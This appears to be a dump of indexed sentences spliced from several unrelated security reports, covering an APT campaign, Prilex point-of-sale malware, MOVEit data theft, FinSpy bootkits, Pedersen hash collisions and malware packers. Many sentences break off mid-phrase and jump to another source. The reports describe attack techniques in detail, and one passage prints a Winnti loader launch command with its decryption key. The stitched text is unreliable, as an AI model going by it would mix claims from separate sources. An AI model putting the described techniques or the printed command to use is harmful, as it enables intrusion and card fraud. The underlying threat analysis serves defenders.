-v50000","2714":"[Target-directory] On other occasions, manual variants of the above command were discovered after using the custom backdoor as described earlier. ","2715":"When the data was gathered on a local system using the backdoor, the files were exfiltrated over the backdoor and the rar files were deleted [T1070.004].","2716":"Where external facing assets were used, like a web server, the data was stored in a location in the Internet Information Services (IIS) web server and exfiltrated over HTTP using GET requests towards the exact file paths [T1041] [T1567] [T1071].

","2720":"The User-Agent value is an interesting one, \u201cMINIXL\u201d.","2721":"When we researched that value, we discovered a blog from Dell SecureWorks from 2015 that mentions the same User-Agent, but also a lot of the artifacts mentioned from the blog overlapped with the observations and TTPs of Operation Harvest [link]. ","2722":"What we could retrieve from open-source databases is that the use of this particular User-Agent is very limited and seems to originate from the APAC region. ","2723":"Who did it? ","2724":"That seems to be the one-million-dollar question to be asked.","2725":"Within McAfee, attribution is not our main focus, protecting our customers is our priority.","2726":"What we do care about is that if we learn about these techniques during an investigation, can we map them out and support our IR team on the ground, or a customer\u2019s IR team, with the knowledge that can help determine which phase of the attack the evidence is pointing to and based on historical data and intelligence, assist in blocking the next phase and discover more evidence? ","2727":"We started by mapping out all MITRE ATT&CK Enterprise techniques and sub-techniques, added the tools used, and did a comparison against historical technique data from the industry.","2728":"We ended up with four groups that shared techniques and sub-techniques.","2729":"The Winnti group was added by us since we discovered the unique encryption function in the custom backdoor and indicators of the use of the Winnti malware. ","2730":"Figure 6 ATT&CK technique comparison The diagram reflecting our outcome insinuated that APT27 and APT41 are the most likely candidates that overlap with the (sub-)techniques we observed. ","2731":"Since all these groups are in a certain time zone, we extracted all timestamps from the forensic investigation with regards to: Registration of domain Compile timestamps of malware (considering deception) Timestamps of command-line activity Timestamps of data exfiltration Timestamps of malware interaction such as creation, deletion, etc. ","2732":"When we converted all these timestamps from UTC to the aforementioned groups\u2019 time zones, we ended up with the below scheme on activity: Figure 7 Adversary\u2019s time of operation In this campaign, we observed how the adversary mostly seems to work from Monday to Thursday and typically during office hours, albeit with the occasional exception. ","2733":"Correlating ATT&CK (sub-)techniques, timestamps, and tools like PlugX and Mimikatz are not the only evidence indicators that can help to identify a possible adversary.","2734":"Command-line syntax, specific code similarity, actor capability over time versus other groups, and unique identifiers are at the top of the \u2018pyramid of pain\u2019 in threat intelligence.","2735":"The bottom part of the pyramid is about hashes, URLs, and domains, areas that are very volatile and easy to change by an adversary. ","2736":"Figure 8 Pyramid of Pain Beyond investigating those artifacts, we also took possible geopolitical interests and potential deception into consideration when building our hypothesis.","2737":"When we mapped out all of these, we believed that one of the two previously mentioned groups were responsible for the campaign we investigated. ","2738":"Our focus was not about attribution though, but more around where the flow of the attack is, matches against previous attack flows from groups, and what techniques\/tools they are using to block next steps, or where to locate them.","2739":"The more details we can gather at the top of \u2018the pyramid of pain\u2019, the better we can determine the likely adversary and its TTP\u2019s. ","2740":"That\u2019s all Folks! ","2741":"Well, not really.","2742":"While correlating the observed (sub-)techniques, the malware families and code, we discovered another targeted attack against a similar target in the same nation with the major motivation of gathering intelligence.","2743":"In the following diagram we conducted a high-level comparison of the tools being used by the adversary: Figure 9 Tools comparison Although some of the tools are unique to each campaign, if taken into consideration over time with when they were used, it makes sense.","2744":"It demonstrates the development of the actor and use of newer tools to conduct lateral movement and to obtain the required level of user rights on systems. ","2745":"Overall, we observed the same modus operandi.","2746":"Once an initial foothold was established, the adversary would deploy PlugX initially to create a few backdoors in the victim\u2019s network in case they were discovered early on.","2747":"After that, using Mimikatz and dumping lsass, they were looking to get valid accounts.","2748":"Once valid accounts were acquired, several tools including some of their own tools were used to gain information about the victim\u2019s network.","2749":"From there, several shares\/servers were accessed, and information gathered.","2750":"That information was exfiltrated as rar files and placed on an internet-facing server to hide in the \u2018normal\u2019 traffic.","2751":"We represent that in the following graphic: Figure 10 Attack flow In the 2019\/2020 case we also observed the use of a malware sample that we would classify as part of the Winnti malware family.","2752":"We discovered a couple of files that were executed by the following command: Start Ins64.exe E370AA8DA0 Jumper64.dat ","2753":"The Winnti loader \u2018Ins64.exe\u2019 uses the value \u2018E370AA8DA0\u2019 to decrypt the payload from the .dat file using the AES-256-CTR decryption algorithm and starts to execute. ","2754":"After executing this command and analyzing the memory, we observed a process injection in one of the svchost processes whereby one particular file was loaded from the following path: C:\\programdata\\microsoft\\windows\\caches\\ieupdate.dll Figure 11","2755":"Memory capture The malware started to open up both UDP and TCP ports to connect with a C2 server.

","2766":"Conclusion Operation Harvest has been a long-term operation whereby an adversary maintained access for multiple years to exfiltrate data.","2767":"The exfiltrated data would have either been part of an intellectual property theft for economic purposes and\/or would have provided insights that would be beneficial in case of military interventions.","2768":"The adversaries made use of techniques very often observed in this kind of attack but also used distinctive new backdoors or variants of existing malware families.","2769":"Combining all forensic artifacts and cross-correlation with historical and geopolitical data, we have high confidence that this operation was executed by an experienced APT actor.

","2788":"title: Prilex: Brazilian PoS malware evolution url: https:\/\/securelist.com\/prilex-atm-pos-malware-evolution\/107551\/ Prilex is a Brazilian threat actor that has evolved out of ATM-focused malware into modular point-of-sale malware.","2789":"The group was behind one of the largest attacks on ATMs in the country, infecting and jackpotting more than 1,000 machines, while also cloning in excess of 28,000 credit cards that were used in these ATMs before the big heist.","2790":"But the criminals\u2019 greed had no limits: they wanted more, and so they achieved it. ","2791":"Active since 2014, in 2016, the group decided to give up ATM malware and focus all of their attacks on PoS systems, targeting the core of the payment industry.","2792":"These are criminals with extensive knowledge of the payment market, and EFT software and protocols.","2793":"They quickly adopted the malware-as-a-service model and expanded their reach abroad, creating a toolset that included backdoors, uploaders and stealers in a modular fashion.","2794":"Since then, we have been tracking the threat actor\u2019s every move, witnessing the damages and great financial losses they brought upon the payments industry. ","2795":"The Prilex PoS malware evolved out of a simple memory scraper into very advanced and complex malware, dealing directly with the PIN pad hardware protocol instead of using higher level APIs, doing real-time patching in target software, hooking operating system libraries, messing with replies, communications and ports, and switching from a replay-based attack to generate cryptograms for its GHOST transactions even from credit cards protected with CHIP and PIN technology. ","2796":"It all started with ATMs during a carnival celebration During the carnival of 2016, a Brazilian bank realized that their ATMs had been hacked, with all the cash contained in those machines stolen.","2797":"According to reports from law enforcement agencies, the criminals behind the attack were able to infect more than 1,000 machines belonging to one bank in the same incident, which allowed them to clone 28,000 unique credit cards across Brazil. ","2798":"The attackers did not have physical access to the machines, but they were able to access the bank\u2019s network by using a DIY device containing a 4G router and a Raspberry PI.","2799":"By opening a backdoor, they were able to hijack the institution\u2019s wireless connection and target ATMs at will.","2800":"After obtaining initial network access, the attacker would run a network recognition process to find the IP address of each of the ATMs.","2801":"With that information in hand, the attackers would launch a lateral movement phase, using default Windows credentials and then installing custom-crafted malware in the desired systems.","2802":"The backdoor would allow the attacker to empty the ATM socket by launching the malware interface and typing a code supplied by the mastermind, the code being specific to each ATM being hacked. ","2803":"ATM infected with Prilex ready to dispense money The malware used in the attack was named Prilex and had been developed from scratch by using privileged information and advanced knowledge of the ATM network.","2804":"To control the ATMs, Prilex did patch in legitimate software for jackpotting purposes.","2805":"Besides its capability to perform a jackpot, the malware was also capable of capturing information from magnetic strips on credit and debit cards inserted into the infected ATMs.","2806":"Afterwards, this valuable information could be used to clone cards and steal further funds from the bank\u2019s clients. ","2807":"Evolving into PoS malware Prilex has evolved out of ATM-focused malware into modular point-of-sale malware targeting payment systems developed by Brazilian vendors, the so-called EFT\/TEF software.","2808":"As we noted in 2018, there are many similarities between their ATM and PoS versions.","2809":"Their first PoS malware was spotted in the wild in October 2016.","2810":"The first two samples had 2010\/2011 as the compilation date, as shown on the graph below.","2811":"However, we believe that invalid compilation dates were set due to incorrect system date and time settings.","2812":"In later versions, the timestamps corresponded to the times when the samples were discovered.","2813":"We also noticed that in the 2022 branch, the developers started using Subversion as the version control system. ","2814":"Versions of the Prilex PoS malware: 3 new versions in 2022 (download) ","2815":"As we see on the graph, Prilex was highly active in 2020, but suddenly disappeared in 2021, resurfacing in 2022 with a release of three new variants. ","2816":"The PoS version of Prilex is coded in Visual Basic, but the stealer module, described in this article, is in p-code.","2817":"In a nutshell, this is an intermediate step between high-level instructions in a Visual Basic program and the low-level native code executed by a CPU.","2818":"Visual Basic translates p-code statements into native code at runtime. ","2819":"A link to the past Prilex is not the only type of PoS malware to originate in Brazil.","2820":"We saw a weak link with the old Trojan-Spy.Win32.SPSniffer, which we described in 2010: both families are able to intercept signals from PIN pads, but use different approaches in doing so. PIN pads are equipped with hardware and security features to ensure that security keys are erased if someone tries to tamper with the device.","2821":"In fact, the PIN is encrypted in the device upon entry using a variety of encryption schemes and symmetric keys.","2822":"Most often, this is a triple DES encoder, making it hard to crack the PIN. ","2823":"There is a problem, though: these devices are always connected to a computer via a USB or serial port, which communicates with the EFT software.","2824":"Older and outdated PIN pad devices use obsolete and weak cryptography schemes, making it easy for malware to install a USB or serial port sniffer to capture and decrypt the traffic between the PIN pad and the infected system.","2825":"This is how SPSniffer gets credit card data.","2826":"Sometimes the traffic is not even encrypted. ","2827":"SPSniffer: serial port sniffer allowing capture of not-encrypted traffic ","2828":"The main approach used by Prilex for capturing credit card data is to use a patch in the PoS system libraries, allowing the malware to collect data transmitted by the software.","2829":"The malware will look for the location of a particular set of executables and libraries in order to apply the patch, thus overwriting the original code.","2830":"With the patch in place, the malware collects the data from TRACK2, such as the account number and expiration date, in addition to other cardholder information needed to perform fraudulent transactions. ","2831":"Initial infection vector Prilex is not a widespread type of malware, as it is not distributed through email spam campaigns.","2832":"It is highly targeted and is usually delivered through social engineering, e.g., a target business may receive a call from a \u201ctechnician\u201d who insists that the company needs to update its PoS software.","2833":"The fake technician may visit the target in person or request the victims to install AnyDesk and provide remote access for the \u201ctechnician\u201d to install the malware. ","2834":"Warning from a PoS vendor about Prilex social engineering attacks Messing with the EMV standard Brazil began migrating to EMV in 1999, and today, nearly all cards issued in the country are chip enabled.","2835":"A small Java-based application lives inside the chip and can be easily manipulated in order to create a \u201cgolden ticket\u201d card that will be valid in most\u2014if not all\u2014point-of-sale systems.","2836":"This knowledge has enabled the criminals to upgrade their toolset, allowing them to create their own cards featuring this new technology and keeping them \u201cin the business.\u201d ","2837":"The initial versions of Prilex were capable of performing the \u201creplay attack,\u201d where, rather than breaking the EMV protocol, they instead took advantage of poor implementations.","2838":"Since payment operators fail to perform some of the validations required by the EMV standard, criminals can exploit this vulnerability within the process to their benefit. ","2839":"In this kind of attack, fraudsters push regular magnetic stripe transactions through the card network as EMV purchases, as they are in control of a payment terminal and have the ability to manipulate data fields for transactions put through that terminal.","2840":"Later they switched to capturing traffic from real EMV-based chip card transactions.","2841":"The thieves could insert stolen card data into the transaction stream, while modifying the merchant and acquirer bank account on the fly. ","2842":"Brazilian cybercriminals have successfully launched replay attacks since at least 2014.","2843":"As pointed out by Brian Krebs, a small financial institution in New England battled some $120,000 in fraudulent charges from Brazilian stores within less than two days.","2844":"The bank managed to block $80,000, but the bank\u2019s processor, which approves incoming transactions when the core systems are offline, let through the other $40,000.","2845":"All of the fraudulent transactions were debit charges.","2846":"All of them came across MasterCard\u2019s network and appeared to be chip transactions without a PIN to MasterCard\u2019s systems. ","2847":"Also worth mentioning is the attack against a German bank in 2019, which registered \u20ac1.5 million in losses and used the same technique.","2848":"The Prilex gang claimed responsibility.","2849":"Judging by the name fields and the functionality of the tool, they probably used the software they are selling in the black market. ","2850":"To automate attacks using cloned credit cards, Prilex criminals used tools like Xiello, discovered by our telemetry in 2020.","2851":"This tool allows the cybercriminals to use credit cards in a batch when making fraudulent purchases.","2852":"It sends the purchase data to credit card acquirers, who then approve or deny the transactions. ","2853":"Xiello tool used by Prilex to automate transactions ","2854":"As the payment industry and credit card issuers fixed EMV implementation errors, replay attacks became obsolete and ineffective, pushing the Prilex gang to innovate and adopt other ways of credit card fraud. ","2855":"From \u201cReplay\u201d to \u201cGhost\u201d The latest versions of Prilex show certain differences to previous ones in the way the attack occurs: the group has switched from the replay attacks to fraudulent transactions using cryptograms generated by the victim card during the in-store payment process, referred to by the malware authors as \u201cGHOST transactions.\u201d ","2856":"In these attacks, the Prilex samples were installed in the system as RAR SFX executables that extracted all required files to the malware directory and executed the installation scripts (VBS files).","2857":"From the installed files, we can highlight three modules used in the campaign: a backdoor, which is unchanged in this version except for the C2 servers used for communication; a stealer module; and an uploader module. ","2858":"Prilex methods of maintaining persistence The stealer module is responsible for intercepting all communications between the point-of-sale software and the PIN pad used for reading the card during the transaction.","2859":"Once it identifies a running transaction, the malware will intercept and modify the content of the transaction in order to be able to capture the card information and to request new EMV cryptograms to the victim\u2019s card.","2860":"These cryptograms are then used in the GHOST transactions. ","2861":"Method used to parse the PIN pad messages sent\/received In order to target a specific process, the criminals will perform an initial screening of the machine\u2014to check if it is an interesting target with enough credit card transactions and to identify the process they will target. ","2862":"After the process is identified, the malware will move forward to install the hooks needed to intercept the transaction information.","2863":"As the communication between the PoS software and the card reader happens through the COM port, the malware will install a hook to many Windows APIs inside the targeted process, aiming to monitor and change data as needed.","2864":"Interestingly enough, instead of allocating memory to the hook procedure, Prilex finds free space within the modules memory, a technique called code cave, making it hard for some security solutions to detect the threat in an infected system. ","2865":"Hook code added into CloseHandle process All captured information from the transaction is saved to an encrypted file placed in a directory previously set by the malware configuration.","2866":"Those files will later be sent to the malware C2 server, allowing the cybercriminals to make transactions through a fraudulent PoS device registered in the name of a fake company. ","2867":"Captured credit card data that will be later sent to the operator server The previous version monitored the transaction in order to get the cryptogram, generated by the card for the original transaction, and then to perform a replay attack using the collected cryptogram.","2868":"In this case, the cryptogram has the same ATC (Application Transaction Counter), allowing the fraudulent transaction to be identified by the reuse of the ATC as well as the fact that the date inside the cryptogram did not match the date when it was submitted, as the fraudulent transactions were submitted at a later point in time. ","2869":"In GHOST attacks performed by the newer versions of Prilex, it requests new EMV cryptograms after capturing the transaction.","2870":"These cryptograms will then be used in a fraudulent transaction through one of the cybercrime tools whose output log can be seen below.

","3000":"Mandiant is aware of multiple cases where large volumes of files have been stolen from victims' MOVEit transfer systems.","3001":"LEMURLOOT can also steal Azure Storage Blob information, including credentials, from the MOVEit Transfer application settings, suggesting that actors exploiting this vulnerability may be stealing files from Azure in cases where victims are storing appliance data in Azure Blob storage, although it is unclear if theft is limited to data stored in this way. ","3002":"In many cases, the scanning and exploitation leading to the delivery of LEMURLOOT was sourced from IP addresses in the range 5.252.188.0\/22, however interaction with the web shell and data theft came from different systems.","3003":"Many of the hosts used to support these second-stage operations hosted RDP services with certificates generated between May 19 and 22, which is suggestive of when this infrastructure may have been staged.

","3247":"Apart from the Trojanized installers, we also observed infections involving usage of a UEFI or MBR bootkit.","3248":"While the MBR infection has been known since at least 2014, details on the UEFI bootkit are publicly revealed in this article for the first time. ","3249":"We decided to share some of our unseen findings about the actual state of FinSpy implants.","3250":"We will cover not only the version for Windows, but also the Linux and macOS versions, since they have a lot of internal structure and code similarities. ","3251":"The full details of this research, as well as future updates on FinSpy, are available to customers of the APT reporting service through our Threat Intelligence Portal. ","3252":"Contact: intelreports@kaspersky.com UEFI infection During our research, we found a UEFI bootkit that was loading FinSpy.","3253":"All machines infected with the UEFI bootkit had the Windows Boot Manager (bootmgfw.efi) replaced with a malicious one.","3254":"When the UEFI transfers execution to the malicious loader, it first locates the original Windows Boot Manager.","3255":"It is stored inside the efi\\microsoft\\boot\\en-us\\ directory, with the name consisting of hexadecimal characters.","3256":"This directory contains two more files: the Winlogon Injector and the Trojan Loader.","3257":"Both of them are encrypted with RC4.","3258":"The decryption key is the EFI system partition GUID, which differs from one machine to another. ","3259":"Sample contents of the \\efi\\microsoft\\boot\\en-us\\ directory Once the original bootloader is located, it is loaded into memory, patched and launched.","3260":"The patched launcher: Patches the function of the OS loader that transfers execution to the kernel The patched function hooks the kernel\u2019s PsCreateSystemThread function, which, when called for the first time, creates an additional thread that decrypts the next loader stage and launches it. ","3261":"The next stage: Locates the Trojan loader file on the EFI partition and decrypts it Waits until a user logs on and injects the Trojan loader into exe. ","3262":"The Trojan loader: Extracts the Trojan from resources and drops it under the name dll Decrypts the Trojan with a XOR-based cipher and unpacks it with aPLib Reflectively loads and launches the Trojan. ","3263":"MBR infection Older machines that do not support UEFI can be infected through the MBR.","3264":"When the victim machine starts up, the infected MBR copies the initial loader code from the last megabyte of the hard drive to the highest available memory located before the EBDA1.","3265":"This code hooks the 13h and 15h BIOS interrupts and then launches the original MBR.","3266":"The 15h interrupt makes sure that the Windows loader does not overwrite the copied code.","3267":"When this interrupt is called to get the size of the area before the EBDA, the hook will reduce the amount of available memory.","3268":"As for the 13h interrupt hook (which manages reading information from disk), it patches the OS loader when it is read from disk.","3269":"Just as in the case with the EFI infection, the hooked functions place their own hooks on further OS loading stages.","3270":"The last hook in the chain creates a thread in the kernel that injects the next stage into winlogon.exe. ","3271":"In case the infection is installed on a 32-bit machine, the process of injecting code into winlogon.exe is more complex than the one observed in the UEFI infection.","3272":"It is as follows: A thread with trampoline shellcode is created inside exe. ","3273":"This shellcode duplicates the exe process handle and transfers it to explorer.exe. ","3274":"The shellcode injects another trampoline shellcode in Explorer. ","3275":"The second shellcode makes exe inject the Trojan loader back into winlogon.exe. ","3276":"This roundabout way of injecting code is intended to trick security solutions. ","3277":"The injected Trojan loader is the same as the UEFI one. ","3278":"User Mode Infection Overview This infection is by far the most complex.","3279":"In short, the attack scenario is as follows: ","3280":"The victim downloads a Trojanized application and executes it. ","3281":"During its normal course of operation the application connects to a C2 server, downloads and then launches a non-persistent component called the Pre-Validator.","3282":"The Pre-Validator ensures that the victim machine is not used for malware analysis. ","3283":"The Pre-Validator downloads Security Shellcodes from the C2 server and executes them.","3284":"In total, it deploys more than 30 shellcodes.","3285":"Each shellcode collects specific system information (e.g. the current process name) and uploads it back to the server. ","3286":"In case a check fails, the C2 server terminates the infection process.","3287":"Otherwise, it continues sending shellcodes. ","3288":"If all security checks pass, the server provides a component that we call the Post-Validator.","3289":"It is a persistent implant likely used to ensure that the victim is the intended one.","3290":"The Post-Validator collects information that allows it to identify the victim machine (running processes, recently opened documents, screenshots) and sends it to a C2 server specified in its configuration.

https:\/\/research.nccgroup.com\/2023\/03\/22\/breaking-pedersen-hashes-in-practice\/\n\nThe Pedersen hash function has gained popularity due to its efficiency in the arithmetic circuits used in zero-knowledge proof systems.","3824":"Hash functions are a crucial primitive in cryptography, and zero-knowledge proof systems often make heavy use of them, for example when computing Merkle tree roots and paths.","3825":"Instead of being based on complex bit-fiddling operations like its standard counterparts (of the SHA or BLAKE families, for example), the Pedersen hash is an algebraic hash function that is simply computed as a linear combination of points on an elliptic curve.","3826":"They are therefore fairly efficient to compute in zero-knowledge circuits since their computations relies on field arithmetic, contrarily to the more traditional hash functions that have no convenient mathematical structure.\n\n","3827":"Based on foundational work from the early 1990s that also led to the formalization of commitment schemes (see for example [CHP91] and [Ped91]), the (originally-named) PedersenHash function was recently put in the spotlight when Zcash researchers Sean Bowe and Daira Hopwood developed specific optimizations for its efficient instantiation in zk-SNARK circuits","3828":"[Zcash].\n","3829":"However, even though the security of the Pedersen hash function is well-understood (since it relies on the assumed hardness of the discrete logarithm problem), a few easily-overlooked subtleties in its definition have the potential to invalidate its security guarantees and thus completely break the security of the systems based on it.\n","3830":"In this blog post, we start by describing the Pedersen hash function, the security guarantees it provides and some of the underlying assumptions it relies on.","3831":"We then show how some of the security properties can be broken when the requirements are not met.","3832":"The definition and the different

function is injective.","3869":"This security property and the definition of the hash function presented above have a few subtleties, which we now explore in more depth.\n","3870":"The first caveat is that the hash function is not collision-resistant for variable-length inputs.","3871":"It is also distinguishable from a random oracle and as such this function should not be used as a pseudorandom function (PRF).\n","3872":"A second important aspect is that in order for this hash function to provide the desired security properties (namely, collision-resistance), it is necessary for the underlying encoding function to be injective.","3873":"Recall that the property of an injective function is that it maps distinct elements of its domain to distinct elements of its codomain.","3874":"In the context of the encoding function \u27e8\u22c5\u27e9, this means that there are no two different message chunks Mi and Mj that result in the same encoded output, see the illustration below.\n\n\n","3875":"The encoding function maps bit strings to scalars.","3876":"In the toy example above, we have seen an example of a simple encoding function where the bit strings were interpreted in little-endian as integers and therefore was clearly injective (within the parameters of our example).\n","3877":"But even with the simple encoding function used in the toy example, care should be taken to ensure that the allowed size of the message we hash is bounded.","3878":"Indeed, if we allowed larger bit strings to be hashed (such that their encoding is larger than the subgroup order), it would be easy for an attacker to compute collisions.","3879":"This is because for any point in the subgroup, multiplication by the subgroup order, call it r, yields the

curve.","3891":"When implementations require this output to be a field element, they sometimes extract the first coordinate of the resulting curve point, which they use as the output of the hash function.","3892":"Crucially, this process can also lead to collisions.","3893":"Indeed, when using a Weierstrass curve with affine coordinates, the negation of a point P = (x, y) is -P = (x, -y).","3894":"Thus, when computing the Pedersen hash and taking only the first coordinate as a result, there is a natural collision, namely the negation of the point.","3895":"It is important to ensure that the encoding process followed by the scalar multiplication cannot produce two points that have the same coordinate extracted as output.","3896":"For example, if using affine coordinates and a curve equation in Weierstrass form, one must ensure that the function cannot produce both P and -P if only the x-coordinate is outputted.\n","3897":"Finally, another important requirement of the Pedersen hash function is that the various generators have to be sampled uniformly at random.","3898":"Specifically, the discrete logarithm of any generator with respect to another one should not be known, not even to the protocol designers.","3899":"Implementers traditionally use hash-to-curve algorithms (a process which does not reveal the discrete logarithm of the output point) and nothing-up-my-sleeve numbers, to prove that the inputs to the hash-to-curve process were selected honestly.","3900":"Odd-looking sets of generators or opaqueness in the generation process could be indicative of a backdoor.\n","3901":"Optimizations\nIn practice, implementations typically use slightly more complex procedures to encode bit strings to scalar.","3902":"In doing so, they are able to compute point multiplications in a more efficient way, though special care needs to be taken to ensure the resulting encoding function is injective, as discussed in the previous section.\n","3903":"The simple Pedersen Hash function presented so far can be significantly sped up in the specific contexts used by zero-knowledge proof systems.","3904":"Since the generators are fixed (and known ahead of time), a method called windowed scalar multiplication can be used to more efficiently perform the multiplication by pre-computing and storing successive powers of the generators.\n","3905":"Windowed scalar multiplication leverages the simple observation that the multiplication of a curve point by a large scalar can be decomposed.\n","3906":"For example, assume our scalar is a 6-bit value b = b0b1b2b3b4b5, and we wish to compute the scalar multiplication b \u22c5","3907":"G.

quantities in the parentheses can take any value in the {0, 7} range, one can precompute the eight values in the set {0, G, 2 \u22c5 G, 3 \u22c5 G, \u2026, 7 \u22c5 G} and perform a variant of a double-and-add algorithm, where at each step the doubling operation is repeated 3 times, and the adding operation involves adding one element from the pre-computed set.\n","3909":"This variant uses the same amount of doubling operation as the standard binary double-and-add algorithm, but it uses fewer point additions (which are generally slower than doubling).\n","3910":"Pushing the optimizations even further, the Zcash team decided to use a signed version of the windowed-multiplication method.","3911":"Specifically, they use a windowed scalar multiplication with an encoding where 3-bit chunks are mapped to elements of the range {-4, \u2026, 4} {0}, instead of the range {0, \u2026, 7}.\n","3912":"Nothing forces alternative implementations of the Pedersen Hash to follow the exact same encoding rules, though in practice many do.","3913":"The encoding function \u27e8\u22c5\u27e9 defined in the Zcash protocol maps element binary strings of fixed length 3 \u22c5 c to a scalar as follows:\n\nwhere in turn, the enc() function maps 3-bit chunks m","3914":"= b0 b1 b2 into elements of the range {-4, \u2026, 4} {0} as\n\nThis choice of using a signed-digit windowed-multiplication method reduces the number of constraints necessary in the arithmetic circuit (since the lookup of the negation of a point can be performed efficiently as negating a point only requires a single constraint).\n","3915":"As discussed above, the security of Pedersen hash is guaranteed provided the encoding scheme is injective.","3916":"Using such a signed representation introduces a few subtleties that should be kept in check in order to ensure the collision-resistance of the hash function.","3917":"The Zcash team proved (in Theorem 5.4.1.","3918":"on page 78 of the protocol specifications, see [Zcash]) that the encoding function is indeed injective and thus provides the desired collision-resistance.","3919":"They did so by showing that the range of the encoding function \u27e8\u22c5\u27e9 was a subset of the range , with  the group order.","3920":"This ensures that there is no overflow of the scalar multiplier that would be \u201cwrapped-around\u201d, which would lead to multiple inputs mapping to the same output, a break of the injectivity requirement.\n","3921":"They also ensured that the coordinate extraction procedure couldn\u2019t lead to the issue described above where both a point and its negation could be obtained as the output of the hash procedure, which could be problematic when using the first-coordinate as the hash output.","3922":"This is described in Section 5.4.9.4 of the Zcash protocol specification [Zcash], where Lemma 5.4.7 shows that if a given point P = (u, v) is on the curve, then (u, -v) is not on the curve, thereby preventing the potential issue outlined.\n","3923":"Note the importance of restricting 0 in the output range of the encoding function.","3924":"If the zero scalar could be obtained, the result of the scalar multiplication would be the point-at-infinity, which could lead to unexpected issues when trying to use that result.\n","3925":"Now that we have a better understanding of the Pedersen hash and

employ Zcash\u2019s signed-digit encoding, which maps bit strings to a range of positive and negative integers centred around 0.\n","3928":"Recall that on a curve in Weierstrass form, the negation of a point P = (x, y) is -P = (x, -y).","3929":"Considering only the x-coordinate, a collision in the hash function output occurs when two messages result in the pair of points only differing in

","4573":"Basic Terminology for Reverse Engineers to Know An executable file can conceal its true code through either encryption or compression.","4574":"When the file is executed, some initial code usually called a stub, decrypts or decompresses the real code so it can be executed.","4575":"These tools, that we will describe in this section, can be used by legitimate vendors that want to protect their software from piracy and copyright violations but threat actors also use these tools to evade detection and make the reversing engineering and analysis process harder. ","4576":"Now, let\u2019s look at these four tools: a packer, crypter, protector, and a loader. ","4577":"What\u2019s a Packer? Packers are often used to compress the payload so it will take less space on disk.","4578":"While packers can be used for legitimate purposes, malware developers utilize packers to make the malicious payload smaller and avoid detection based on static malware analysis techniques. ","4579":"Examples: UPX is an open-source packing algorithm. ","4580":"MPRESS is a free packer. ","4581":"Andromeda is a custom packer that makes reverse-engineering more difficult. ","4582":"What\u2019s a Crypter? ","4583":"Some security tools use signatures or keywords to detect malware.","4584":"To avoid detection by these tools, malware developers can use crypters.","4585":"A crypter encrypts the payload, so it will be harder for signature-based and standard anti-viruses to detect the malicious payload. ","4586":"Examples: PEUNION EXECryptor What\u2019s a Protector? ","4587":"For most threat actors, one of the goals they want to achieve is to evade detection, and if the malware is detected then make the analysis process harder for researchers.","4588":"That\u2019s where protectors come into the picture \u2013 they offer many features that can make static and dynamic analysis tedious and time-consuming.","4589":"Having said that, legitimate organizations can use protectors to protect their software from being cracked and manipulated. ","4590":"Usually, protectors will encrypt the payload, remove and obfuscate imports, implement anti-debugging and anti-reversing techniques, and much more. Examples: Themida Enigma Protector VMProtect What\u2019s a Loader? ","4591":"Packed malware samples are compressed and stored inside the final executable, which will extract and execute the malware.","4592":"On the other hand, there are loaders that serve as the first stage of the attack, the payload of the malware can be part of the loader\u2019s file or it can be downloaded from a remote location (by the loader, also known as a Downloader).","4593":"In addition, loaders can be used to set persistence and additional components needed for the execution of the malware.","4594":"For example, Bazarloader is a sophisticated loader with multiple techniques that is used in attacks against high-profile organizations.","4595":"Bazarloader delivers all sorts of threats, from spam to ransomware like Conti or Ryuk. ","4596":"In many cases, malware is delivered by tools that implement some (or all) of the functionalities of packers, crypters, protects, and loaders \u2013- all to make the analysis harder.","4597":"For example, Morphine has its loader and can encrypt the original file. ","4598":"Deep Dive Into How Packers Work and Detection ","4599":"Now let\u2019s focus on packers, how they work, how to identify packed files, and how to extract the packed payload that can contain malicious code. ","4600":"How do packers work? ","4601":"The packed file contains three main components: packed content, a new PE header, and a stub, as seen in the image below: Packed sample view. ","4602":"The packers compress (and if it has the functionality of a crypter also encrypts) the original executable, which is saved in one of the sections of the final packed file.","4603":"The entry point of the original file is relocated, and so is the Import Address Table (IAT).","4604":"The stub is a small part of code that implements the decompression (and decryption) of the originally packed file.","4605":"A new PE header is prepended to the packed file or modifies the existing header so it will be a valid executable. ","4606":"How to detect packed files 1.","4607":"Static detection When data is being compressed or encrypted, the output is not structured and resembles more random data, resulting in high entropy.","4608":"In information theory, entropy is a measure of disorder\/randomness.","4609":"The calculation is done using logarithm with base 2, also known as Shannon entropy, the result is in units of bits, hence the range of entropy level for binary files is 0 to 8. ","4610":"We can check the entropy of the file sections, and if one of them has a value of 7 or higher, there is a high probability that the file is packed. ","4611":"Packers may change the final payload\u2019s section names, as seen in the screenshot below.","4612":"But in most cases, malware authors will rename the sections to more commonly used names that will not give away the fact that the file is packed. ","4613":"Multiple tools can be used to detect indicators of a sample being packed: PEstudio, DiE (Detect it Easy), CFF explorer, and more.","4614":"There are many examples and tutorials that use these tools, so we will show another free tool that can be handy in this and later stages: radare2. ","4615":"Viewing the section of a file (see technical analysis on this packer here). ","4616":"Packed samples usually have very few imports as they don\u2019t rely on external libraries like other programs.","4617":"When a file has a low number of imports, it strongly indicates that it contains another component that is dropped\/loaded.","4618":"However, malware developers can add \u201cdummy\u201d imports to mislead researchers. ","4619":"Viewing the imports for a packed file; full analysis results here. ","4620":"Reverse Engineering Example: Static Unpacking of UPX Packed Samples ","4621":"Standard UPX packed samples can be identified by the section names, as long as they were not modified by the attackers.","4622":"Let\u2019s take a look at a sample with MD5 5598febfbf00839c9f7047d9fe3205e3. ","4623":"The section names of the files contain the UPX string, as seen in the screenshot below: We can use the UPX command line utility to extract the packed payload.","4624":"The command to decompress a packed file is as follows: upx -d <packed>","4625":"-o <extracted payload> ","4626":"You can run the command on the sample and verify that the extracted file has MD5 6d13f5d287fd735a9bbc261aafb49006. ","4627":"2.","4628":"Dynamic detection When we dynamically analyze a packed file, we aim to extract the payload.","4629":"Several functions can be a good place for putting a breakpoint and attempting to fetch the extraction process.","4630":"Let\u2019s look at API calls and debuggers. ","4631":"API Calls Essentially, all packers need to perform the following operations: allocate memory, change permissions, read the encrypted\/packed chunk of code, decrypt it, load it to the allocated memory space and execute it.","4632":"To make all of these actions, the program must use system calls because these actions require interaction with the kernel. ","4633":"The relevant system calls are VirtualAlloc used for allocating memory in the current process.","4634":"The memory is automatically initialized to zero.","4635":"One of the arguments is dwSize \u2013 that\u2019s the size in bytes.","4636":"Knowing the size can help identify when a program allocates big memory space, possibly for the unpacked payload. ","4637":"VirtualProtect changes the permissions of the given virtual address.","4638":"When malware wants to grant write or execute permissions flNewProtect argument will be set to 